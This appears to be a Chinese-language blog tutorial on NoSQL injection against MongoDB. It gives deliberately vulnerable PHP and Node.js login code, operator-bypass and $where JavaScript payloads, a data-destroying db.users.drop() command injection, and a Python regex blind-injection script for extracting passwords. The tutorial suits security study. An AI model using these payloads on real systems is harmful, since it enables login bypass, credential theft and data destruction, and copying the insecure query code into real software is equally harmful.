# 原创
：  NoSQL 注入

# NoSQL 注入

#### NoSQL 注入

## 基本概念

### NoSQL

> 



### MongoDB

> 



### Memcached

> 



### Redis

> 



## MongoDB 初步

### MongoDB 基础概念解析

> 



```
{
	"_id" : ObjectId("60fa854cf8aaaf4f21049148"),
	"name" : "whoami",
	"description" : "the admin user",
	"age" : 20,
	"status" : "D",
	"groups" : [
		"admins",
		"users"
	]
}

```

|SQL 概念|MongoDB 概念|说明
|------
|database|database|数据库
|tables|collection|数据库表/集合
|row|document|数据记录行/文档
|column|field|数据字段/域
|index|index|索引
|tables joins|表连接，MongoDB不支持
|primary key|primary key|主键，MongoDB自动将`_id`字段设置为主键

#### 数据库（Database）

> 



> 



#### 文档（Document）

> 



```
{"username":"H3rmesk1t","password":"flag{ef5b8877-c871-4832-8c88-57dd2397a04c}"}

```

#### 集合（Collection）

> 



```
{"username":"H3rmesk1t"}
{"username":"H3rmesk1t","password":"flag{ef5b8877-c871-4832-8c88-57dd2397a04c}"}
{"username":"H3rmesk1t","password":"flag{ef5b8877-c871-4832-8c88-57dd2397a04c}","ways":["Misc","Web"]}

```

> 



### MongoDB 基础语法解析

#### MongoDB 创建数据库

> 



#### MongoDB 创建集合

> 



#### MongoDB 插入文档

> 



#### MongoDB 更新文档

> 



##### update 方法

```
db.collection.update(
   &lt;query&gt;,
   &lt;update&gt;,
   {
     upsert: &lt;boolean&gt;,
     multi: &lt;boolean&gt;,
     writeConcern: &lt;document&gt;
   }
)

参数说明：
query：update 操作的查询条件, 类似 sql update 语句中 where 子句后面的内容
update：update 操作的对象和一些更新的操作符（如 $set）等, 可以理解为 sql update 语句中 set 关键字后面的内容
multi：可选，默认是 false, 只更新找到的第一条记录, 如果这个参数为 true, 就把按条件查出来多条记录全部更新

```

> 



```
db.person.update({'usernmae':'admin'},{$set:{'username':'H3rmesk1t'}},{multi:true})

```

##### save 方法

> 



```
db.collection.save(
   &lt;document&gt;,
   {
     writeConcern: &lt;document&gt;
   }
)

参数说明：
document：文档数据

```

#### MongoDB 查询文档

> 



```
db.collection.find(query, projection)

参数说明：
query：可选, 使用查询操作符指定查询条件, 相当于 sql select 语句中的 where 子句
projection：可选, 使用投影操作符指定返回的键

```

#### MongoDB 与 RDBMS Where 语句的比较

|操作|格式|语句|RDBMS类似语句
|------
|=|{&lt; key &gt;:&lt; value &gt;}|db.person.find({‘username’:‘admin’}).pretty()|where name = ‘admin’
|&lt;|{&lt; key &gt;:{$lt:&lt; value &gt;}}|db.person.find({‘age’:’{$lt:20}}).pretty()|where age &lt; 20
|&lt;=|{&lt; key &gt;:{$lte:&lt; value &gt;}}|db.person.find({‘age’:’{$lte:20}}).pretty()|where age &lt;= 20
|&gt;|{&lt; key &gt;:{$gt:&lt; value &gt;}}|db.person.find({‘age’:’{$gt:20}}).pretty()|where age &gt; 20
|&gt;=|{&lt; key &gt;:{$gte:&lt; value &gt;}}|db.person.find({‘age’:’{$gte:20}}).pretty()|where age &gt;= 20
|!=|{&lt; key &gt;:{$ne:&lt; value &gt;}}|db.person.find({‘age’:’{$ne:20}}).pretty()|where age != 20

#### MongoDB AND 条件

> 



#### MongoDB OR 条件

> 



```
&gt; db.collection.find(
   {
      $or: [
         {key1: value1}, {key2:value2}
      ]
   }
).pretty()

```

#### AND 和 OR 联合使用

> 
以下实例演示了 AND 和 OR 联合使用，类似于 RDBMS 中的 WHERE 语句： `where age&gt;19 AND (name='whoami' OR status='A')`


```
db.all_users.find({"age":{$gt:19}, $or: [{"name":"whoami"}, {"status":"A"}]})
{ "_id" : ObjectId("60fa9176f8aaaf4f21049150"), "name" : "whoami", "description" : "the admin user", "age" : 20, "status" : "A", "groups" : [ "admins", "users" ] }

```

## Nosql注入简介

> 



```
NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren’t using the traditional SQL syntax. Because these NoSQL injection attacks may execute within a procedural language, rather than in the declarative SQL language, the potential impacts are greater than traditional SQL injection.

NoSQL database calls are written in the application’s programming language, a custom API call, or formatted according to a common convention (such as XML, JSON, LINQ, etc). Malicious input targeting those specifications may not trigger the primarily application sanitization checks. For example, filtering out common HTML special characters such as &lt; &gt; &amp; ; will not prevent attacks against a JSON API, where special characters include / { } :

```

> 



## Nosql 注入的分类

> 



```
重言式注入：
又称为永真式，此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制

联合查询注入：
联合查询是一种众所周知的 SQL 注入技术，攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据

JavaScript 注入
MongoDB Server 支持 JavaScript，这使得在数据引擎进行复杂事务和查询成为可能，但是传递不干净的用户输入到这些查询中可以注入任意的 JavaScript 代码，导致非法的数据获取或篡改

盲注
当页面没有回显时，那么我们可以通过 $regex 正则表达式来达到和传统 SQL 注入中 substr() 函数相同的功能，而且 NoSQL 用到的基本上都是布尔盲注

```

## PHP 中的 MongoDB 注入

### 重言式注入

> 



> 



```
&lt;?php 
show_source();

$manager = new MongoDB\Driver\Manager("mongodb://127.0.0.1:27017");
$username = $_POST['username'];
$password = $_POST['password'];

$query = new MongoDB\Driver\Query(array(
	'username' =&gt; $username,
	'password' =&gt; $password
));

$result = $manager-&gt;executeQuery('test.users', $query)-&gt;toArray();
$count = count($result);
if ($count &gt; 0) {
	foreach ($result as $user) {
		$user = ((array)$user);
		echo "Login Success".PHP_EOL;
		echo 'username:' . $user['username'].PHP_EOL;
		echo 'password:' . $user['password'].PHP_EOL;
	}
} else {
	echo 'Login Failed';
}
?&gt;

```

> 



```
username=admin&amp;password=admin123

```

> 



```
array(
	'username' =&gt; 'admin',
	'password' =&gt; 'admin123'
)

```

> 



```
db.users.find({'username':'admin', 'password':'admin123'})

{ "_id" : ObjectId("61445fbaa7a3dc15f3ac9c91"), "username" : "admin", "password" : "admin123" }

```

> 



```
usernmae[$ne]=0&amp;password[$ne]=0

```

> 



```
db.users.find({'username':{$ne:1}, 'password':{$ne:1}})

{ "_id" : ObjectId("61445fbaa7a3dc15f3ac9c91"), "username" : "admin", "password" : "admin123" }
{ "_id" : ObjectId("61445fd0a7a3dc15f3ac9c92"), "username" : "Gyan", "password" : "20080826" }
{ "_id" : ObjectId("61445fe1a7a3dc15f3ac9c93"), "username" : "guest", "password" : "guest" }
{ "_id" : ObjectId("61445fe7a7a3dc15f3ac9c94"), "username" : "demo", "password" : "demo" }
{ "_id" : ObjectId("61445ff9a7a3dc15f3ac9c95"), "username" : "Tom", "password" : "123456" }

```

> 



> 



```
username[$ne]=0&amp;password[$ne]=0
username[$lt]=0&amp;password[$lt]=0
username[$lte]=0&amp;password[$lte]=0
username[$gt]=0&amp;password[$gt]=0
username[$gte]=0&amp;password[$gte]=0

```

### 联合查询注入

> 



```
string query = "{username:'" + $username + "', password:'" + $password + "'}"

```

> 



```
{'usernmae':'admin', 'password':'admin123'}

```

> 



```
username=admin', $or: [ {}, {'a': 'a&amp;password='}], $comment: '123456

```

> 



```
{'username':'admin', $or: [ {}, {'a': 'a', password:''}], $comment: '123456'}

select * from logins where username = 'admin' and (password true&lt;&gt; or ('a'='a' and password = '')))

```

### JavaScript 注入

> 



#### $where 操作符

> 



```
db.users.find({ $where: "function(){return(this.username == 'admin')}" })

{ "_id" : ObjectId("60fa9c80257f18542b68c4b9"), "username" : "admin", "password" : "admin123" }

```

> 



```
db.users.find({ $where: "function(){return(this.username == $username)}" })

```

> 



```
db.users.find({ $where: "function(){return(this.username == 'd1no'; sleep(5000))}" })

```

> 



> 



```
&lt;?php
$manager = new MongoDB\Driver\Manager("mongodb://127.0.0.1:27017");
$username = $_POST['username'];
$password = $_POST['password'];
$function = "
function() { 
	var username = '".$username."';
	var password = '".$password."';
	if(username == 'admin' &amp;&amp; password == 'admin123'){
		return true;
	}else{
		return false;
	}
}";
$query = new MongoDB\Driver\Query(array(
    '$where' =&gt; $function
));
$result = $manager-&gt;executeQuery('test.users', $query)-&gt;toArray();
$count = count($result);
if ($count &gt; 0) {
	foreach ($result as $user) {
		$user = ((array)$user);
		echo "Login Success".PHP_EOL;
		echo 'username:' . $user['username'].PHP_EOL;
		echo 'password:' . $user['password'].PHP_EOL;
	}
} else {
	echo 'Login Failed';
}
?&gt;

```

##### MongoDB 2.4 之前

> 



```
username=1&amp;password=1';(function(){return(tojson(db.getCollectionNames()))})();var a='1

```

##### MongoDB 2.4 之后

> 



```
username=1&amp;password=1';return true//
或
username=1&amp;password=1';return true;var a='1

```

> 



```

array(
    '$where' =&gt; "
    function() { 
		var username = '1';
		var password = '1';return true;var a='1';
		if(username == 'admin' &amp;&amp; password == '123456'){
			return true;
		}else{
			return false;
		}
	}
")

```

> 



```

db.users.find({$where: "function() { var username = '1';var password = '1';return true;var a='1';if(username == 'admin' &amp;&amp; password == '123456'){ return true; }else{ return false; }}"})

{ "_id" : ObjectId("61445fbaa7a3dc15f3ac9c91"), "username" : "admin", "password" : "admin123" }
{ "_id" : ObjectId("61445fd0a7a3dc15f3ac9c92"), "username" : "Gyan", "password" : "20080826" }
{ "_id" : ObjectId("61445fe1a7a3dc15f3ac9c93"), "username" : "guest", "password" : "guest" }
{ "_id" : ObjectId("61445fe7a7a3dc15f3ac9c94"), "username" : "demo", "password" : "demo" }
{ "_id" : ObjectId("61445ff9a7a3dc15f3ac9c95"), "username" : "Tom", "password" : "123456" }

```

> 



> 



```
username=1&amp;password=1';(function(){var date = new Date(); do{curDate = new Date();}while(curDate-date&lt;5000); return Math.max();})();var a='1

```

#### Command 方法注入

> 



```

&lt;?php
$manager = new MongoDB\Driver\Manager("mongodb://127.0.0.1:27017");
$username = $_POST['username'];

$cmd = new MongoDB\Driver\Command( [
    'eval' =&gt; "db.users.distinct('username',{'username':'$username'})"
] );

$result = $manager-&gt;executeCommand('test.users', $cmd)-&gt;toArray();
$count = count($result);
if ($count &gt; 0) {
    foreach ($result as $user) {
        $user = ((array)$user);
        echo '====Login Success====&lt;br&gt;';
        echo 'username:' . $user['username'] . '&lt;br&gt;';
        echo 'password:' . $user['password'] . '&lt;br&gt;';
    }
}
else{
    echo 'Login Failed';
}
?&gt;

```

> 



```
username=1'});db.users.drop();db.user.find({'username':'1
username=1'});db.users.insert({"username":"admin","password":123456"});db.users.find({'username':'1

```

### 布尔盲注

> 



```
&lt;?php
show_source();

$manager = new MongoDB\Driver\Manager("mongodb://127.0.0.1:27017");
$username = $_POST['username'];
$password = $_POST['password'];

$query = new MongoDB\Driver\Query(array(
    'username' =&gt; $username,
    'password' =&gt; $password
));

$result = $manager-&gt;executeQuery('test.users', $query)-&gt;toArray();
$count = count($result);
if ($count &gt; 0) {
    foreach ($result as $user) {
        $user = ((array)$user);
        echo '====Login Success====&lt;br&gt;';
        echo 'username:' . $user['username'] . '&lt;br&gt;';
        echo 'password:' . $user['password'] . '&lt;br&gt;';
    }
}
else{
    echo 'Login Failed';
}
?&gt;

```

<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2233fe56eee9410dbf4961d668342f90.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDNybWVzazF0,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/9d6cb26455c64b6da4161c7b5ec408dc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDNybWVzazF0,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"/>

> 



```
username=admin&amp;password[$regex]=a.{7}
或
username=admin&amp;password[$regex]=^a

```

> 



```
import requests
import string

password = ''
url = 'http://127.0.0.1/html/demo.php'

while True:
    for c in string.printable:
        if c not in ['*', '+', '.', '?', '|', '#', '&amp;', '$']:
            
            # When the method is GET
            get_payload = '?username=admin&amp;password[$regex]=^%s' % (password + c)
            # When the method is POST
            post_payload = {
                "username": "admin",
                "password[$regex]": '^' + password + c
            }
            # When the method is POST with JSON
            json_payload = """{"username":"admin", "password":{"$regex":"^%s"}}""" % (password + c)
            #headers = {'Content-Type': 'application/json'}
            #r = requests.post(url=url, headers=headers, data=json_payload)    # 简单发送 json
            
            r = requests.post(url=url, data=post_payload)
            if 'Login Success' in r.text:
                print("[+] %s" % (password + c))
                password += c

```

## Nodejs 中的 MongoDB 注入

> 



```
server.js

var express = require('express');
var mongoose = require('mongoose');
var jade = require('jade');
var bodyParser = require('body-parser');

mongoose.connect('mongodb://localhost/test', { useNewUrlParser: true });
var UserSchema = new mongoose.Schema({
    name: String,
    username: String,
    password: String
});
var User = mongoose.model('users', UserSchema);
var app = express();

app.set('views', __dirname);
app.set('view engine', 'jade');

app.get('/', function(req, res) {
    res.render ("index.jade",{
        message: 'Please Login'
    });
});

app.use(bodyParser.json());

app.post('/', function(req, res) {
    console.log(req.body)
    User.findOne({username: req.body.username, password: req.body.password}, function (err, user) {
        console.log(user)
        if (err) {
            return res.render('index.jade', {message: err.message});
        }
        if (!user) {
            return res.render('index.jade', {message: 'Login Failed'});
        }
        
        return res.render('index.jade', {message: 'Welcome back ' + user.name + '!'});
    });
});

var server = app.listen(8000, '0.0.0.0', function () {

    var host = server.address().address
    var port = server.address().port

    console.log("listening on http://%s:%s", host, port)
});

index.js

h1 #{message}
p #{message}

```

> 



```
{"username":{"\u0024\u006e\u0065":1},"password": {"\u0024\u006e\u0065":1}}
// {"username":{"$ne":1},"password": {"$ne":1}}

```

## Nosql 注入相关工具

> 



## 参考文章

> 


